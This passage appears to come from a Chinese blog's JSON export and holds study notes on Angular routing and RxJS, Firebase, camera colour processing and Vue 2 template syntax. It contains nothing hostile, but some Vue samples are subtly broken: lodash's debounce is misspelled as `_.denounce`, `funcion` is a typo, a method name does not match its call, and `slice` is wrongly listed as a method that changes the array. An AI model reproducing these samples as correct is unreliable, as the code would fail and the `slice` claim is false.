构建函数的初始化很有意思，它有一个快捷方式，即在参数定义中，可以直接将参数赋值给相应名称的属性，这个做法跟 c++ 不太一样，示例如下： constructor*(private messageService: MessageService) { } 路由理论上路由貌似应该是一个全局的东西，当用户在浏览器中，或者在页面上点击某个链接时，根据链接中的 path，从路由表中查到对应的组件，然后展示该组件（有点类似后端的路由，只是后端的路由是调用某个视图函数，而前端变成了调用某个视图组件）； 貌似是一个内置的组件，用来展示路由返回的结果 RouterModule 的方法 forRoot，用来添加路由表； routerLink 属性用来在 HTML 页面上的 标签中指定路由路径； 定义路径时，可以用冒号来表示变量，例如 “&#x2F;detail&#x2F;:id”，此处 id 是一个变量； 当用户点击某个包含 routerLink 属性的链接时，路由器将接受到事件对象，并跳转到对应的组件，之后组件有可能需要接受参数数据来完成初始化，此时需要用到 ActivatedRoute 对象来获得所需的参数数据； 示例：ActivatedRoute.snapshot.paramMap.get(“id”) 但是有时候可能该参数很大，例如是一个对象，此时该如何传递数据呢？ 当用户从 A 组件页面跳转到 B 组件页面后，如果需要返回原来的 A 组件页面，貌似有两种方法，一种是在 B 页面上面放置 A 页面的链接。这种方法需要多一些工作量；如果此时能够记住原来的页面栈，而用一个通用返回方法，回到页面栈的上一层就会非常的方便，此时需要用到一个内置的 Location 服务，来获得该页面栈； 添加路由的过程 创建：创建 routing 路由模块；通过 CLI 创建时，它会自动在 app 根模块中引入路由模块； 映射：路由模块中定义路径和组件的映射关系，以便当用户点击或在浏览器中输入路径时，可以展示相应的组件；记得定义一个默认路径，让其重定向到指定的路径； 展示：在需要展示组件的位置，添加内置的 router-outlet 组件，它会将路由返回的组件展示出来；一般此时还会在 HTML 页面上添加导航，以便在不同的版块之间切换； 链接：给需要进行跳转的组件添加 routerLink 属性，当用户点击时，实现跳转； HTTP 通过引入内置的 HttpClient 模块，可以实现发送 HTTP 请求；由于请求返回的结果是异步的，因此 angular 使用 RxJS 库来处理异步，RxJS 将请求结果封装为 Observable 对象，有点类似 promise，可以调用该对象的 subscribe 方法，来获得异步返回的数据； HttpClient 拥有常见的各种请求方法，例如 get&#x2F;post&#x2F;put&#x2F;delete 等，它的调用方式有点特别，需要使用类似 C++ 中的泛型来定义返回数据的类型，例如： HttpClient.get&lt;Hero[]&gt;(url)，此处 url 为参数，不同的请求方法，接受的参数个数不同；所有的请求方法都会返回一个 RxJS 中的 Observable 对象； RxJS 的 Observable 对象有一个 pipe 方法，该方法可用来将多个函数组合成一个函数。当条件满足时，该组合函数会被触发（调用），然后它会依次执行组合中的各个函数；例如： 12345return this.http.get&lt;Hero&gt;(url).pipe( tap(_ =&gt; this.log(`fetched hero id=$&#123;id&#125;`)), catchError(this.handleError&lt;Hero&gt;(`getHero id=$&#123;id&#125;`))); 此处的 tap 和 catchError 都是内置函数，但是它们的执行场景不同，tap 一定会执行，而 catchError 仅在 HTTP Response 报错的情况下才会执行；这两个函数都接受一个回调函数做为其参数，并在得到 Response 后，调用该回调函数； 因此，在 HttpClient 请求中结合 pipe，我们就可以对返回的结果加入一些我们想要实现的额外操作，例如 log 和错误处理等； RxJS 有很多内置方法（称为 operator），例如 map, tap, catchError 等，这些内置方法可以很方便的实现一些常用的功能，详细可查看官方文档：https://rxjs.dev/api RxJS 库中还有另外一个特别的东西叫 Subject，本质上它是一个特定类型的 Observable 对象，因此它同样支持 Observable 的各种方法，它的作用原理很像是一个 EventEmitter，它有一个 next 方法，当调用该方法时，给它传递一个参数，然后就会触发之前通过 pipe 传递进去的那些函数，示例如下： 1234567891011121314151617// 初始化一个 Subject 对象searchTerm = new Subject&lt;string&gt;();// 调用 Subject 的 pipe 方法，放入回调函数heroes$ = searchTerm.pipe( // 在用户输入关键字后，等待 300 毫秒，如果用户没有继续输入，再触发关键字搜索 debounceTime(300), // 如果输入和之前的关键字相同，则不触发搜索 distinctUntilChanged(), // 当关键字变化时，切换到新的搜索结果 switchMap((term: string) =&gt; this.heroService.searchHeroes(term)),)// 定义事件处理函数，当事件发生时，调用 Subject 对象的 next 方法，传递最新的参数数据search(term: string): void &#123; this.searchTerm.next(term);&#125; 由于 Observable 的 pipe 方法返回的是一个 Observable 对象，因此这里加了特殊的符号 heroes$ 来表示该类型，而不是直接用 heroes 的常见变量名，这也直接导致随后在 Component 的 HTML 模板中绑定该变量时，需要使用 angular 内置的 async 来处理，示例如下： 1&lt;li *ngFor=&quot;let hero of heroes$ | async&quot;&gt;&lt;/li&gt; 常用命令创建 组件：ng generate component 服务：ng generate service 模块：ng generate module –flat –module&#x3D;app –flat：表示不需要为该模块创建单独的文件夹，而是放在根文件夹下面，即 src&#x2F;app 文件夹中； –module&#x3D;app：表示将该模块注册登录在 AppModule 模块中（即在 AppModule 模块中 import）； 启动调试服务器ng serve –open","categories":[],"tags":[{"name":"软件","slug":"软件","permalink":"http://example.com/tags/%E8%BD%AF%E4%BB%B6/"},{"name":"javascript","slug":"javascript","permalink":"http://example.com/tags/javascript/"}]},{"title":"Firebase","slug":"Firebase","date":"2021-11-04T01:28:00.000Z","updated":"2024-09-21T03:57:54.312Z","comments":true,"path":"2021/11/04/Firebase/","permalink":"http://example.com/2021/11/04/Firebase/","excerpt":"","text":"Firebase 就像名字中所携带的 base 字样透露出的信息，它是一个数据库；Firebase 是 Google 提供的一个 Baas 云产品（Backend as a service 后端服务化）；Firebase 将数据库的常用操作封装成一个库，开发者可以在前端代码中直接调用，与数据库进行交互，这样一来就省去了传统后端应用的开发，由前端直接跟数据库打交道； 适用场景：在轻量化应用中，Firebase 可以大大节省开发的工作量；但它也意味着将原来的后端逻辑全部搬到前端了，而前端是运行在浏览器中的，有可能不适合运行一些密集运算，另外也将整个应用的逻辑全部暴露出来，并非所有的应用都适合该场景； 开发者通过 Firebase SDK 也 Google 服务器直接交互，因此在使用 Firebase 之前，需要先在 Google 控制台申请 API 账号，然后在 SDK 中使用该账号；这带来一个有趣的问题，显然该账号信息是不能传输到前端的，那么要如何保持私密性呢？貌似仍然不可避免需要有一个后端服务来处理这个事情；","categories":[],"tags":[{"name":"软件","slug":"软件","permalink":"http://example.com/tags/%E8%BD%AF%E4%BB%B6/"},{"name":"数据库","slug":"数据库","permalink":"http://example.com/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/"}]},{"title":"数字图像处理","slug":"数字图像处理","date":"2021-10-20T02:20:00.000Z","updated":"2024-09-21T10:31:19.708Z","comments":true,"path":"2021/10/20/数字图像处理/","permalink":"http://example.com/2021/10/20/%E6%95%B0%E5%AD%97%E5%9B%BE%E5%83%8F%E5%A4%84%E7%90%86/","excerpt":"","text":"数字图像基础视觉感知要素人的主观亮度是进入人眼的光线强度的对数函数，并且在暗光环境和亮光环境下，该函数有所不同；两个函数有交叉的部分。当人眼从一个光线环境切换到另外一个光线环境时，眼睛需要有一个适应的过程，此时人眼会调整自身的光线灵敏度，来完成这种适应； 韦伯比：光线变化量与变化前的光线强度的比值 delta I &#x2F; I；在低照明环境，韦伯比比较大（说明此时人眼较不敏感）；在高照明环境下，韦伯比降低（说明此时人眼对光线变化变得更加敏感了）； 在背景照明（即环境光线）恒定时，人眼可辨别的亮度级别是有限的（12-24级左右），但是当人眼开始移动时，背景照明会跟着变化，因此导致人眼能够辨别很大的亮度范围； 当背景照明变化时，由于人眼会重新适应和调整自己，因此这时在变化的边缘区域，会出现有趣的现象，此时人眼的感知不是线性的，而是会出现小范围的波动（上冲和下冲现象，马赫带效应）； 人眼对某个区域的亮度判断，并不完全取决于该区域的光线强度，还跟该区域所处的背景强相关；如果背景是暗的，则物体看起来更白；如果背景是亮的，则物体看起来变暗； 光和电磁波谱光是一种电磁波，不同的电磁波有不同的波长和频率，频率越高的电磁波，其携带的能量越大，此时波长也相应的越短；人眼可感知的光的波长范围大概在 0.43 - 0.79 um 之间； 除了频率（波长）外，有三个指标可用来描述光的属性： 发光强度：光源发出的能量总量，单位瓦特 W； 光通量：观察者从光源感受到的能量，单位流明数 lm； 亮度：观察者对感知到的光的主观描绘参数，个体之间存在差异，因此不可度量（大致相当于强度描述）； 图像感知和获取基本原理：使用传感器，将光的能量转换成电压变化的波形，再解析波形成为数字信号； i 表示入射分量，表示环境光源；r 表示反射分量，表示目标物体的反射光，取值范围为 0-1，表示对环境光源的全反射到全吸收之间的范围；公式中的取值范围是理论上的，现实生活中不可能存在无穷大的光源，不同环境中的光源强度总是在有限的范围内； 图像取样和量化由于传感器输出的是连续的电压波形，因此需要进一步做取样和量化动作，以便将这些波形数据数字化； 对比度：照片中最高和最低灰度级间的灰度差； 最大可度量灰度和最小可度量灰度构成了图片的动态范围；最小可度量灰度跟噪声有关； 分辩率：单位距离的线或点的总数量；印刷行业一般用点数，即 dpi（dot per inch）； 彩色图像处理传感器有很多种类型，不同类型的感光特性不同；同一感光材料，对不同波长的敏感度不同；波长越长的电磁波，进入材料越深，因此有更大的可能性被吸收，导致最终结果是光电转换率更低； 不同颜色的电磁波，在感光材料上面的光电转换效率： 原始的传感器数据是马赛克形式的，因此首先需要进行插值计算，去除马赛克，得到每一个像素点的三通道值；有很多种去除马赛克的算法，最简单的办法是取邻近点的平均值，缺点是物体边缘会不够锐利；更好的算法会稍微复杂一点，例如考虑变化幅度，当变化幅度超过临界点时，可以判断该点属于物体的边缘，因此只取纵向或横向的平均值（有些算法还会考虑该点所处的位置，例如是角点、边点、还是中间点等情况）； 饱和度：指相对的纯净度，即一种颜色混合白光的数量；纯色是全饱和的，加了白色后变成次饱和的；饱和度和所加的白光数量成反比； 曝光：场景中某些物体表面由于反射的光线少，可能很暗，因此需要延长传感器接收光线的时间，这样才能收集到足够多的信息，得以看清该物体的细节；但是延长传感器的工作时间是一把双刃剑，因为此时画面中也有可能存在比较明亮的物体（反射光线多），如果延长传感器工作的时间，则会导致明亮物体区域接收到过多的光线值，如果该值超过了上限，则会导致该明亮物体最终呈现为白色，丢失了细节；因此，选择合适的曝光时间，尽量多的保留画面中核心区域的细节，是一个不可缺少的环节； 白平衡：环境光源是多种多样的，不同的环境光源，其不同波长的电磁波组成不同，因此在该环境中，物体会出现色差；有时这种色差正是我们所需要的，但有时候则不是我们想要的。白平衡的目标，就是换出环境光源各部分光线的构成比例，并加予干预调节，让其回归到某个标准光源环境的光线比例，从而让画面中的物体，能够展示在标准光源环境下的色彩；通常白平衡并没有直接调整传感器的模拟信号值，而是调整模拟信号转换后的数字信号值，对每个通道使用不同系数进行调整； 白天日光环境下 RGB 光波的比例坐标： RIMM RGB: Reference Input&#x2F;Output Medium Metric RGB 白平衡后的数字信号，到最终显示结果之间，有三个动作需要做： 将数字信号转成颜色模型； 色阶调整（因为需要考虑最终结果的观看环境跟拍摄环境不同，例如图片观看多数在室内，而拍摄通常在室外） 转换成显示设备的颜色模型； 不同的数码相机，这三个步骤有不同的处理算法，并且它们之间不一定有明确的分界线； 传感器收集到的原始数据，需要转换为颜色值，此时需要采用某种能够表示色彩的模型；理想情况下，针对不同的环境光线，相机应使用不同的计算公式，计算出对应的色值；但在实际应用中，该步骤一般直接使用白平衡补偿后的数据；虽然这种做法可以让中性色物体恢复到正常的色值，但其他颜色则无法还原准确；理论上相机系统可以根据白平衡参数，计算出光源类型，然后再调用最合适的色彩计算模型进行色值计算； 由于人眼对颜色的感知跟人眼所处的环境光线有直接关系，因此在计算色值前，需要考虑最终的图片将在何种光线环境下被查看，并基于该查看环境，来计算合适的色值；通常情况下，会假设存在一个统一的查看环境，将基于该环境进行计算；但有时对于专业摄影场景，则省去该计算步骤，保留原值，让摄像者在后期进行自定义处理； 相机所采用的颜色模型可以是设备无关的，例如 CIEXYZ 或者 CIELab，但也可以是设备相关的，例如 RIMM RGB 模型； 经过白平衡计算后的色值，需要进一步考虑曝光参数，计算出曝光校正后的色值， 非纯性的曝光数据 -&gt; 查 LUT 表转成纯性的曝光数据 -&gt; 颜色校正Matrix，得到 XYZ 色值 -&gt; RIMM 转换Matrix，得到线性 RIMM RGB 色值 -&gt; 查 LUT 表，转成非线性的 RIMM RGB 值；在实际计算时，中间过程的两个矩阵可以合并成一个矩阵； 然后再按以下公式转成非线性的 RGB； 色阶调整照片的观看环境通常与拍摄环境不同，前者通常在室内（光线较暗），拍摄则通常在室外（光线较亮），因此在处理照片数据时，需要有一个色阶调整的环节，通过增加对比度，让照片通常在较暗的环境看得清楚； 大脑在观看照片时，存在一个心理学现象，即会强化某种现象，例如脑海中的草的颜色，会比现实中的更加鲜艳（纯度更高）； 照片的动态范围，通常要比实际生活中的更小一些，因此在做照片的处理时，需要丢弃一些动态范围信息（即对信息进行压缩）； RIMM 与 ROMM 的映射图 输出模型照片最终要在某种显示设备上进行展示，因此最后一个环节需要将数据转成目标设备的颜色模型，目前国际标准是采用 sRGB 模型。这个模型的优点是通用性很强，几乎所有的显示设备都支持。缺点是它显示的颜色范围较小，因此可能无法满足一些高端显示设备的要求；如果已知目标设备，则此步可以将照片直接转成目标设备所使用的颜色模型，而不是通过 sRGB； 第一步：将非线性的 ROMM RGB 值转成线性的； 第二步：将线性 ROMM RGB 转在 D50 XYZ 值； 第三步：将 D50 XYZ 转成 D65 XYZ 第四步：将 D65 XYZ 转成线性的 RGB 值 第五步：将线性 RGB 转成非线性的 RGB 注：其中第2步到第4步的三个矩阵运算，可以合并成一个矩阵 因此，整个计算过程可以简化为 LUT - Matrix - LUT 三部曲；","categories":[],"tags":[{"name":"软件","slug":"软件","permalink":"http://example.com/tags/%E8%BD%AF%E4%BB%B6/"},{"name":"图像处理","slug":"图像处理","permalink":"http://example.com/tags/%E5%9B%BE%E5%83%8F%E5%A4%84%E7%90%86/"}]},{"title":"Vue2","slug":"Vue2","date":"2021-08-04T01:57:00.000Z","updated":"2024-09-21T07:23:45.252Z","comments":true,"path":"2021/08/04/Vue2/","permalink":"http://example.com/2021/08/04/Vue2/","excerpt":"","text":"收获 在实例化 Vue 对象时，data 属性所引用的 data 对象的属性，在实例时就固定下来了；即如果后续给 data 对象添加的新属性，并不会出现在 Vue 对象中； 在 HTML 标签上可以使用 v-bind 等指令，来将某个标签的属性值和某个 vue 对象的属性值进行绑定； 在 input 标签上使用 v-model 指令，可以实现在输入框中，对 vue 对象属性值的修改，从而实现双向绑定； 组件绑定的对象，如果使用了 Object.freeze 方法处理过，则绑定将失效，即对象属性的更新，将不再会反应到视图上面； 生命周期钩子Vue 实例由若干个阶段组成它的生命周期，它带来一些内置的方法，可以在这些阶段插入一些想要实现的函数，即所谓的钩子，包括 created、mounted、updated、destroyed 等； 模板语法插值文本用双大括号绑定 Vue 实例的 data；如果在 HTML 标签上添加 v-once 属性，则插值只会赋值一次，之后不会动态更新； 123&lt;span&gt;Message: &#123;&#123; msg &#125;&#125;&lt;/span&gt;&lt;span v-once&gt;这个将不会改变: &#123;&#123; msg &#125;&#125;&lt;/span&gt; 原始 HTML当 Vue 实例的 data 不是普通的字符串，而是原始 html 格式字符串时，如果使用常规的双大括号，这些 html 格式的字符串，将被当成普通的文本处理；此时需要改成给标签增加 v-html 属性来绑定值，它才会被当作 HTML 处理； 123&lt;p&gt;Using mustaches: &#123;&#123; rawHtml &#125;&#125;&lt;/p&gt; &lt;p&gt;Using v-html directive: &lt;span v-html=&quot;rawHtml&quot;&gt;&lt;/span&gt;&lt;/p&gt; Attribute双大括号的写法，无法将 data 值赋给 HTML 标签的属性，此时需要使用 v-bind 指令来达到预期效果 123&lt;div v-bind:id=&quot;dynamicId&quot;&gt;&lt;/div&gt;&lt;!---或者也可以直接写成如下格式---&gt;&lt;div :id=&quot;dynamicId&quot;&gt;&lt;/div&gt; 使用 javascript 表达式在双大括号的内部，除了给绑定 data 值外，也是可以使用 javascript 表达式的； 1234567&#123;&#123; number + 1 &#125;&#125; &#123;&#123; ok ? &#x27;YES&#x27; : &#x27;NO&#x27; &#125;&#125; &#123;&#123; message.split(&#x27;&#x27;).reverse().join(&#x27;&#x27;) &#125;&#125; &lt;div v-bind:id=&quot;&#x27;list-&#x27; + id&quot;&gt;&lt;/div&gt; 指令“指令”指的是在 HTML 标签中使用 v- 前缀的特殊属性；除了 v-for 外，指令的值应为单个 javascript 表达式；它的作用是当表达式的值发生改变时，能够将新值作用于 DOM 元素，使其产生预期的变化； 1&lt;p v-if=&quot;seen&quot;&gt;现在你看到我了&lt;/p&gt; 参数有些指令能够接收参数，用来将表达式与参数所代表的属性值或者事件进行绑定 123&lt;a v-bind:href=&quot;url&quot;&gt;...&lt;/a&gt;&lt;a v-on:click=&quot;doSomething&quot;&gt;...&lt;/a&gt; 动态参数参数早期是一个静态的字符串，如果想让它变成动态的，则可以通过增加中括号来实现；这个时候参数实际上是一个表达式，通过表达式的求值，获得绑定目标，一般来说，这个目标应该是字符串类型的值，除了 null 外，其他非字符串的结果都会引发错误； 另外表达式存在一些约束，例如不能使用空格或者引号、不能使用大写字符来定义键名（会被强制转化小写，可能导致表达式求值失败）； 1&lt;a v-bind:[attributeName]=&quot;url&quot;&gt; ... &lt;/a&gt; 修饰符指令允许接以点号为标记的后缀，用来表达该指令需要以特殊的方式进行绑定； 例如：.prevent 修饰符告诉 v-on 指令对于触发的事件调用 event.preventDefault()： 1&lt;form v-on:submit.prevent=&quot;onSubmit&quot;&gt;...&lt;/form&gt; 缩写v-bind 缩写12345678&lt;!-- 完整语法 --&gt; &lt;a v-bind:href=&quot;url&quot;&gt;...&lt;/a&gt; &lt;!-- 缩写 --&gt; &lt;a :href=&quot;url&quot;&gt;...&lt;/a&gt; &lt;!-- 动态参数的缩写 (2.6.0+) --&gt; &lt;a :[key]=&quot;url&quot;&gt; ... &lt;/a&gt; v-on 缩写12345678&lt;!-- 完整语法 --&gt; &lt;a v-on:click=&quot;doSomething&quot;&gt;...&lt;/a&gt; &lt;!-- 缩写 --&gt; &lt;a @click=&quot;doSomething&quot;&gt;...&lt;/a&gt; &lt;!-- 动态参数的缩写 (2.6.0+) --&gt; &lt;a @[event]=&quot;doSomething&quot;&gt; ... &lt;/a&gt; 计算属性和侦听器双大括号适合用来放置一些简单的变量，虽然它也支持内置表达式，但是如果表达式很长，或者逻辑比较复杂，则看起来比较困难，此时可以使用 Vue 实例中的 computed 属性，在这个属性中，同样可以内置变量，但这些变量实际上是函数，当 HTML 标签绑定到这些变量后，它实际上是会执行函数并将最终结果赋值给标签； 1234&lt;div id=&quot;example&quot;&gt; &lt;p&gt;Original message: &quot;&#123;&#123; message &#125;&#125;&quot;&lt;/p&gt; &lt;p&gt;Computed reversed message: &quot;&#123;&#123; reversedMessage &#125;&#125;&quot;&lt;/p&gt; &lt;/div&gt; 1234567891011var vm = new Vue(&#123; el: &#x27;#example&#x27;, data: &#123; message: &#x27;Hello&#x27; &#125;, computed: &#123; // 计算属性的 getter reversedMessage: function () &#123; // `this` 指向 vm 实例 return this.message.split(&#x27;&#x27;).reverse().join(&#x27;&#x27;); &#125; &#125;&#125;); 计算属性 vs 方法事实上，前面的例子，也可以通过给 HTML 标签绑定 Vue 实例的方法来实现； 1&lt;p&gt;Reversed message: &quot;&#123;&#123; reversedMessage( ) &#125;&#125;&quot;&lt;/p&gt; 1234567var vm = new Vue(&#123; methods: &#123; reverseMessage: function () &#123; return this.message.split(&#x27;&#x27;).reverse().join(&#x27;&#x27;); &#125; &#125;&#125;); 虽然二者的结果是相同的，但是背后却有所区别；如果是绑定 Vue 实例的方法，每次访问变量，都会执行方法计算结果；但计算属性则使用缓存来返回结果，直到所绑定的标签发生变化后，才会重新求值，因此它的性能更加好；对于简单的计算二者区别不明显，但是如果计算量很大，则可能产生明显差别； 计算属性 vs 监听属性监听属性可以用来监听 data 中的属性值变化，当发生变化时，就会调用提前写好的监听函数；当有某个变量是由多个其他变量合成的时候，则将该变量放置在计算属性中是更加简单的做法； 1&lt;div id=&quot;demo&quot;&gt;&#123;&#123; fullName &#125;&#125;&lt;/div&gt; 1234567891011121314151617// 监听属性的做法var vm = new Vue(&#123; el: &#x27;#demo&#x27;, data: &#123; firstName: &#x27;Foo&#x27;, lastName: &#x27;Bar&#x27;, fullName: &#x27;Foo Bar&#x27; &#125;, watch: &#123; firstName: function (val) &#123; this.fullName = val + &#x27; &#x27; + this.lastName &#125;, lastName: function (val) &#123; this.fullName = this.firstName + &#x27; &#x27; + val &#125; &#125; &#125;)； 12345678910111213// 计算属性的做法var vm = new Vue(&#123; el: &#x27;#demo&#x27;, data: &#123; firstName: &#x27;Foo&#x27;, lastName: &#x27;Bar&#x27; &#125;, computed: &#123; fullName: function () &#123; return this.firstName + &#x27; &#x27; + this.lastName; &#125; &#125;&#125;); 计算属性的 setter计算属性默认只有 getter，但其实它也支持 setter 的做法； 1234567891011121314computed: &#123; fullName: &#123; // getter get: function () &#123; return this.firstName + &#x27; &#x27; + this.lastName &#125;, // setter set: function (newValue) &#123; var names = newValue.split(&#x27; &#x27;) this.firstName = names[0] this.lastName = names[names.length - 1] &#125; &#125; &#125; 侦听器可以用来监听实例 data 属性中某个变量值的变化；当监听到某个变量值变化时，相应的函数就会被触发；大多数情况下使用计算属性更合适，但偶尔有时候，使用侦听属性更方便；监听器特别适合用来执行一些异步或计算开销大的函数； 1234&lt;div id=&quot;watch-example&quot;&gt; &lt;p&gt; Ask a yes/no question: &lt;input v-model=&quot;question&quot;&gt; &lt;/p&gt; &lt;p&gt;&#123;&#123; answer &#125;&#125;&lt;/p&gt; &lt;/div&gt; 123456789101112131415161718192021222324252627282930var watchExampleVM = new Vue(&#123; el: &#x27;#watch-example&#x27;, data: &#123; question: &#x27;&#x27;, answer: &#x27;I cannot give you an answer until you ask a question!&#x27; &#125;, watch: &#123; // 如果 `question` 发生改变，这个函数就会运行 question: function (newQuestion, oldQuestion) &#123; this.answer = &#x27;Waiting for you to stop typing...&#x27;; this.debouncedGetAnswer(); &#125; &#125;, created: function () &#123; // 初始化时，调用 lodash 的 denounce，生成一个限制频率的新函数； this.denounceGetAnswer = _.denounce(this.getAnswer, 500); &#125;, methods: &#123; getAnswer: funcion () &#123; this.answer = &#x27;Thinking...&#x27; var vm = this; axios.get(&#x27;https://yesno.wtf/api&#x27;) .then(function (response) &#123; vm.answer = _.capitalize(response.data.answer) &#125;) .catch(function (error) &#123; vm.answer = &#x27;Error! Could not reach the API. &#x27; + error &#125;); &#125; &#125;&#125;); Class 与 Style 绑定绑定 HTML class使用 v-bind 进行表达式与属性的绑定时，表达式的计算结果是字符串，多数情况下这是OK的，但是如果是要动态的改变 CSS 的 Class 时，拼接字符串就显得麻烦而且容易出错；此时可以通过给 v-bind:class 传递一个对象，来实现对 CSS Class 的动态增加和减少（即让 HTML 是否拥有哪几个 Class）； 123&lt;div v-bind:class=&quot;&#123; active: isActive &#125;&quot;&gt;&lt;/div&gt;&lt;!-- 当 isActive 的值为 true 时，div 就拥有 active 类，等同如下写法，否则没有 --&gt;&lt;div class=&quot;active&quot;&gt;&lt;/div&gt; 另外上面的例子，还可以写成如下的样子 1&lt;div v-bind:class=&quot;classObj&quot;&gt;&lt;/div&gt; 1234567var vm = new Vue(&#123; data: &#123; classObj: &#123; active: isActive &#125; &#125;&#125;); 甚至 classObj 还可以放在计算属性中，实现更高级和复杂的场景； 1&lt;div v-bind:class=&quot;classObj&quot;&gt;&lt;/div&gt; 12345678910data: &#123; isActive: true&#125;,computed: &#123; classObj: function () &#123; return &#123; active: this.isActive &#125; &#125;&#125; 数组语法除了对象外，v-bind:class 还支持数组类型的值，以实现同时绑定多个 class 1&lt;div v-bind:class=&quot;[activeClass, errorClass]&quot;&gt;&lt;/div&gt; 1234data: &#123; activeClass: &#x27;active&#x27;, errorClass: &#x27;text-danger&#x27;&#125; 用在组件上在定义组件时，允许在 template 上面提前写入一些 class，之后在引用组件时，还可以再定义 class，此时的定义不会覆盖前面的定义； 123Vue.component(&#x27;my-component&#x27;, &#123; template: &#x27;&lt;p class=&quot;foo bar&quot;&gt;Hi&lt;/p&gt;&#x27; &#125;); 1&lt;my-component class=&quot;baz boo&quot;&gt;&lt;/my-component&gt; 最终的渲染结果如下： 1&lt;p class=&quot;foo bar baz boo&quot;&gt;Hi&lt;/p&gt; 绑定内联样式对象语法1&lt;div v-bind:style=&quot;styleObject&quot;&gt;&lt;/div&gt; 1234567// 除了绑定 data，也可以绑定计算属性 computeddata: &#123; styleObject: &#123; color: &#x27;red&#x27;, fontSize: &#x27;13px&#x27; &#125; &#125; 数组语法1&lt;div v-bind:style=&quot;[baseStyles, overridingStyles]&quot;&gt;&lt;/div&gt; 自动添加前缀如果某些 CSS 样式需要根据不同的浏览器格式要求，添加相应的前缀，例如 transform，该工作会由 Vue 自动侦测并处理； 多重值支持数组提供多个备用值，Vue 会自动检查哪个值适用，如果都不适用，则使用最后那一个； 1&lt;div :style=&quot;&#123; display: [&#x27;-webkit-box&#x27;, &#x27;-ms-flexbox&#x27;, &#x27;flex&#x27;] &#125;&quot;&gt;&lt;/div&gt; 条件渲染v-if12&lt;h1 v-if=&quot;awesome&quot;&gt;Vue is awesome!&lt;/h1&gt; &lt;h1 v-else&gt;Oh no 😢&lt;/h1&gt; 如果需要对多个 HTML 元素实现条件切换，则可以使用 把这些元素包起来形成一个组； 12345&lt;template v-if=&quot;ok&quot;&gt; &lt;h1&gt;Title&lt;/h1&gt; &lt;p&gt;Paragraph 1&lt;/p&gt; &lt;p&gt;Paragraph 2&lt;/p&gt; &lt;/template&gt; v-else-if如果有多个条件分支，则可以使用 v-else-if 1234&lt;div v-if=&quot;type === &#x27;A&#x27;&quot;&gt; A &lt;/div&gt; &lt;div v-else-if=&quot;type === &#x27;B&#x27;&quot;&gt; B &lt;/div&gt; &lt;div v-else-if=&quot;type === &#x27;C&#x27;&quot;&gt; C &lt;/div&gt; &lt;div v-else&gt; Not A/B/C &lt;/div&gt; 用 key 管理可复用的元素对于在 if-else 中重复出现的部分，Vue 会对其进行复用，以提高渲染的速度；如果有些情况复用是不必要的，则可以通过给每个标签增加不同 key 来实现； 12345678&lt;template v-if=&quot;loginType === &#x27;username&#x27;&quot;&gt; &lt;label&gt;Username&lt;/label&gt; &lt;input placeholder=&quot;Enter your username&quot; key=&quot;username-input&quot;&gt; &lt;/template&gt; &lt;template v-else&gt; &lt;label&gt;Email&lt;/label&gt; &lt;input placeholder=&quot;Enter your email address&quot; key=&quot;email-input&quot;&gt; &lt;/template&gt; v-showv-if 用来决定是否渲染，v-show 则一定会渲染元素，但控制它是否显示；当某个元素可能出现频繁的切换时，使用 v-show 更加合理，性能开销更小； 列表渲染v-forv-for 可以用来基于某个数组渲染出元素的列表 123&lt;ul id=&quot;example-1&quot;&gt; &lt;li v-for=&quot;item in items&quot; :key=&quot;item.message&quot;&gt; &#123;&#123; item.message &#125;&#125; &lt;/li&gt; &lt;/ul&gt; 123456789var example1 = new Vue(&#123; el: &#x27;#example-1&#x27;, data: &#123; items: [ &#123; message: &#x27;Foo&#x27; &#125;, &#123; message: &#x27;Bar&#x27; &#125; ] &#125; &#125;); 除了 item 外，v-for 还支持增加一个 index 参数，另外可以在 v-for 中访问父作用域的属性值 12345&lt;ul id=&quot;example-2&quot;&gt; &lt;li v-for=&quot;(item, index) in items&quot;&gt; &#123;&#123; parentMessage &#125;&#125; - &#123;&#123; index &#125;&#125; - &#123;&#123; item.message &#125;&#125; &lt;/li&gt; &lt;/ul&gt; 12345678910var example2 = new Vue(&#123; el: &#x27;#example-2&#x27;, data: &#123; parentMessage: &#x27;Parent&#x27;, items: [ &#123; message: &#x27;Foo&#x27; &#125;, &#123; message: &#x27;Bar&#x27; &#125; ] &#125; &#125;); 在 v-for 里使用对象v-for 除了可以用遍历数组外，还可以用来遍历对象的属性 12345&lt;ul id=&quot;v-for-object&quot; class=&quot;demo&quot;&gt; &lt;li v-for=&quot;value in object&quot;&gt; &#123;&#123; value &#125;&#125; &lt;/li&gt;&lt;/ul&gt; 12345678910new Vue(&#123; el: &#x27;#v-for-object&#x27;, data: &#123; object: &#123; title: &#x27;How to do lists in Vue&#x27;, author: &#x27;Jane Doe&#x27;, publishedAt: &#x27;2016-04-10&#x27; &#125; &#125; &#125;); 类似数组支持 index 作为第二个参数，对象也支持键名作为第二个参数，index 作为第三个参数 123&lt;div v-for=&quot;(value, name) in object&quot;&gt; &#123;&#123; name &#125;&#125;: &#123;&#123; value &#125;&#125;&lt;/div&gt; 123&lt;div v-for=&quot;(value, name, index) in object&quot;&gt; &#123;&#123; index &#125;&#125;. &#123;&#123; name &#125;&#125;: &#123;&#123; value &#125;&#125; &lt;/div&gt; 维护状态默认情况下，当 v-for 所绑定的数组的数据发生变动时，v-for 会更新原生成的列表，但是为了提高渲染速度，它不是按照数组里面的新顺序来重新生成列表的，而是会复用原列表的顺序，然后仅仅替换其中的数据，这意味着列表的顺序仍然是旧的，只有数据是新的； 如果列表的顺序与数组的顺序保持一致，则需要给 v-for 增加一个 key 属性（应为字符串类型或数组类型的值） 123&lt;div v-for=&quot;item in items&quot; v-bind:key=&quot;item.id&quot;&gt; &lt;!-- 内容 --&gt; &lt;/div&gt; 一般来说，在使用 v-for 时，尽量同时使用 v-bind:key，因为这样的输出结果符合大多数情况下的预期； 数组更新检测变更方法数组有一些内置的方法，这些方法会改掉原有数组的内容； push pop shift unshift reverse sort slice 非变更方法以下方法不会改变原有的数组，而是返回一个新的数组 concat filter slice 显示过滤&#x2F;排序后的结果如果想在不改变原有数组的情况下，显示一个过滤或排序后的数组，则可以考虑使用计算属性 1&lt;li v-for=&quot;n in evenNumbers&quot;&gt;&#123;&#123; n &#125;&#125;&lt;/li&gt; 12345678910data: &#123; numbers: [ 1, 2, 3, 4, 5 ]&#125;, computed: &#123; evenNumbers: function () &#123; return this.numbers.filter(function (number) &#123; return number % 2 === 0 &#125;); &#125;&#125; 在 v-for 里面使用值范围123&lt;div&gt; &lt;span v-for=&quot;n in 10&quot;&gt;&#123;&#123; n &#125;&#125; &lt;/span&gt; 